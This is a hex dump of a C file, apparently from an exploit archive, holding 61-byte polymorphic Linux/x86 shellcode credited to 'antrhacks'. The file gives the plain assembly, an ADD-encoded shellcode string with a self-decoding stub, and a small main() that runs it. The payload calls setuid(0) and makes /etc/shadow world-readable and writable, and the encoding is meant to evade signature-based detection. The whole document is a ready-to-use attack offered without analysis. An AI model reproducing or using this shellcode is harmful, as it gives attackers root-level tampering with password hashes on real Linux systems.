00000000  2f 2a 20 0d 0a 20 2a 20  54 69 74 6c 65 3a 20 6c  |/* .. * Title: l|
00000010  69 6e 75 78 2f 78 38 36  20 53 68 65 6c 6c 63 6f  |inux/x86 Shellco|
00000020  64 65 20 50 6f 6c 79 6d  6f 72 70 68 69 63 20 2d  |de Polymorphic -|
00000030  20 73 65 74 75 69 64 28  30 29 20 2b 20 63 68 6d  | setuid(0) + chm|
00000040  6f 64 28 22 2f 65 74 63  2f 73 68 61 64 6f 77 22  |od("/etc/shadow"|
00000050  2c 30 36 36 36 29 20 53  68 65 6c 6c 63 6f 64 65  |,0666) Shellcode|
00000060  20 36 31 20 42 79 74 65  73 20 20 0d 0a 20 2a 20  | 61 Bytes  .. * |
00000070  45 6e 63 6f 64 65 20 20  3a 20 5f 41 44 44 0d 0a  |Encode  : _ADD..|
00000080  20 2a 20 41 75 74 68 6f  72 3a 20 61 6e 74 72 68  | * Author: antrh|
00000090  61 63 6b 73 0d 0a 20 2a  20 50 6c 61 74 66 6f 72  |acks.. * Platfor|
000000a0  6d 3a 20 4c 69 6e 75 78  20 58 38 36 0d 0a 2a 2f  |m: Linux X86..*/|
000000b0  0d 0a 0d 0a 2f 2a 20 30  72 69 67 69 6e 41 6c 20  |..../* 0riginAl |
000000c0  41 53 53 65 6d 62 6c 79  0d 0a 20 33 31 20 64 62  |ASSembly.. 31 db|
000000d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000000e0  09 78 6f 72 20 20 20 20  25 65 62 78 2c 25 65 62  |.xor    %ebx,%eb|
000000f0  78 0d 0a 20 62 30 20 31  37 20 20 20 20 20 20 20  |x.. b0 17       |
00000100  20 20 20 20 20 20 20 20  20 09 6d 6f 76 20 20 20  |         .mov   |
00000110  20 24 30 78 31 37 2c 25  61 6c 0d 0a 20 63 64 20  | $0x17,%al.. cd |
00000120  38 30 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |80              |
00000130  20 20 09 69 6e 74 20 20  20 20 24 30 78 38 30 0d  |  .int    $0x80.|
00000140  0a 20 33 31 20 63 30 20  20 20 20 20 20 20 20 20  |. 31 c0         |
00000150  20 20 20 20 20 20 20 09  78 6f 72 20 20 20 20 25  |       .xor    %|
00000160  65 61 78 2c 25 65 61 78  0d 0a 20 35 30 20 20 20  |eax,%eax.. 50   |
00000170  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000180  09 70 75 73 68 20 20 20  25 65 61 78 0d 0a 20 36  |.push   %eax.. 6|
00000190  38 20 36 31 20 36 34 20  36 66 20 37 37 20 20 20  |8 61 64 6f 77   |
000001a0  20 20 20 20 09 70 75 73  68 20 20 20 24 30 78 37  |    .push   $0x7|
000001b0  37 36 66 36 34 36 31 0d  0a 20 36 38 20 36 33 20  |76f6461.. 68 63 |
000001c0  32 66 20 37 33 20 36 38  20 20 20 20 20 20 20 09  |2f 73 68       .|
000001d0  70 75 73 68 20 20 20 24  30 78 36 38 37 33 32 66  |push   $0x68732f|
000001e0  36 33 0d 0a 20 36 38 20  32 66 20 32 66 20 36 35  |63.. 68 2f 2f 65|
000001f0  20 37 34 20 20 20 20 20  20 20 09 70 75 73 68 20  | 74       .push |
00000200  20 20 24 30 78 37 34 36  35 32 66 32 66 0d 0a 20  |  $0x74652f2f.. |
00000210  38 39 20 65 33 20 20 20  20 20 20 20 20 20 20 20  |89 e3           |
00000220  20 20 20 20 20 09 6d 6f  76 20 20 20 20 25 65 73  |     .mov    %es|
00000230  70 2c 25 65 62 78 0d 0a  20 36 36 20 62 39 20 62  |p,%ebx.. 66 b9 b|
00000240  36 20 30 31 20 20 20 20  20 20 20 20 20 20 09 6d  |6 01          .m|
00000250  6f 76 20 20 20 20 24 30  78 31 62 36 2c 25 63 78  |ov    $0x1b6,%cx|
00000260  0d 0a 20 62 30 20 30 66  20 20 20 20 20 20 20 20  |.. b0 0f        |
00000270  20 20 20 20 20 20 20 20  09 6d 6f 76 20 20 20 20  |        .mov    |
00000280  24 30 78 66 2c 25 61 6c  0d 0a 20 63 64 20 38 30  |$0xf,%al.. cd 80|
00000290  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002a0  09 69 6e 74 20 20 20 20  24 30 78 38 30 0d 0a 20  |.int    $0x80.. |
000002b0  34 30 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |40              |
000002c0  20 20 20 20 20 09 69 6e  63 20 20 20 20 25 65 61  |     .inc    %ea|
000002d0  78 0d 0a 20 63 64 20 38  30 20 20 20 20 20 20 20  |x.. cd 80       |
000002e0  20 20 20 20 20 20 20 20  20 09 69 6e 74 20 20 20  |         .int   |
000002f0  20 24 30 78 38 30 0d 0a  2a 2f 0d 0a 0d 0a 0d 0a  | $0x80..*/......|
00000300  23 69 6e 63 6c 75 64 65  20 22 73 74 64 69 6f 2e  |#include "stdio.|
00000310  68 22 0d 0a 0d 0a 63 68  61 72 20 73 68 65 6c 6c  |h"....char shell|
00000320  63 6f 64 65 5b 5d 20 3d  20 22 5c 78 65 62 5c 78  |code[] = "\xeb\x|
00000330  31 31 5c 78 35 65 5c 78  33 31 5c 78 63 39 5c 78  |11\x5e\x31\xc9\x|
00000340  62 31 5c 78 33 37 5c 78  38 30 5c 78 36 63 5c 78  |b1\x37\x80\x6c\x|
00000350  30 65 5c 78 66 66 5c 78  31 33 22 0d 0a 20 20 20  |0e\xff\x13"..   |
00000360  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000370  22 5c 78 38 30 5c 78 65  39 5c 78 30 31 5c 78 37  |"\x80\xe9\x01\x7|
00000380  35 5c 78 66 36 5c 78 65  62 5c 78 30 35 5c 78 65  |5\xf6\xeb\x05\xe|
00000390  38 5c 78 65 61 5c 78 66  66 5c 78 66 66 5c 78 66  |8\xea\xff\xff\xf|
000003a0  66 22 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |f"..            |
000003b0  20 20 20 20 20 20 20 22  5c 78 34 34 5c 78 65 65  |       "\x44\xee|
000003c0  5c 78 63 33 5c 78 32 61  5c 78 65 30 5c 78 39 33  |\xc3\x2a\xe0\x93|
000003d0  5c 78 34 34 5c 78 64 33  5c 78 36 33 5c 78 37 62  |\x44\xd3\x63\x7b|
000003e0  5c 78 37 34 5c 78 37 37  22 0d 0a 20 20 20 20 20  |\x74\x77"..     |
000003f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 22 5c  |              "\|
00000400  78 38 32 5c 78 38 61 5c  78 37 62 5c 78 37 36 5c  |x82\x8a\x7b\x76\|
00000410  78 34 32 5c 78 38 36 5c  78 37 62 5c 78 37 62 5c  |x42\x86\x7b\x7b\|
00000420  78 34 32 5c 78 34 32 5c  78 37 38 5c 78 38 37 22  |x42\x42\x78\x87"|
00000430  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00000440  20 20 20 20 20 22 5c 78  39 63 5c 78 66 36 5c 78  |     "\x9c\xf6\x|
00000450  37 39 5c 78 63 63 5c 78  63 39 5c 78 31 34 5c 78  |79\xcc\xc9\x14\x|
00000460  63 33 5c 78 32 32 5c 78  65 30 5c 78 39 33 5c 78  |c3\x22\xe0\x93\x|
00000470  35 33 5c 78 65 30 22 0d  0a 20 20 20 20 20 20 20  |53\xe0"..       |
00000480  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 39  |            "\x9|
00000490  33 22 3b 20 0d 0a 0d 0a  69 6e 74 20 6d 61 69 6e  |3"; ....int main|
000004a0  28 29 0d 0a 7b 0d 0a 20  20 20 20 20 20 20 20 70  |()..{..        p|
000004b0  72 69 6e 74 66 28 22 20  5b 2a 5d 20 50 6f 6c 79  |rintf(" [*] Poly|
000004c0  6d 6f 72 70 68 69 63 20  53 68 65 6c 6c 63 6f 64  |morphic Shellcod|
000004d0  65 20 2d 20 6c 65 6e 67  74 68 3a 20 25 64 5c 6e  |e - length: %d\n|
000004e0  22 2c 73 74 72 6c 65 6e  28 73 68 65 6c 6c 63 6f  |",strlen(shellco|
000004f0  64 65 29 29 3b 0d 0a 20  20 20 20 20 20 20 20 28  |de));..        (|
00000500  2a 28 76 6f 69 64 28 2a  29 28 29 29 20 73 68 65  |*(void(*)()) she|
00000510  6c 6c 63 6f 64 65 29 28  29 3b 0d 0a 0d 0a 20 20  |llcode)();....  |
00000520  20 20 20 20 20 20 72 65  74 75 72 6e 20 30 3b 0d  |      return 0;.|
00000530  0a 7d                                             |.}|
00000532
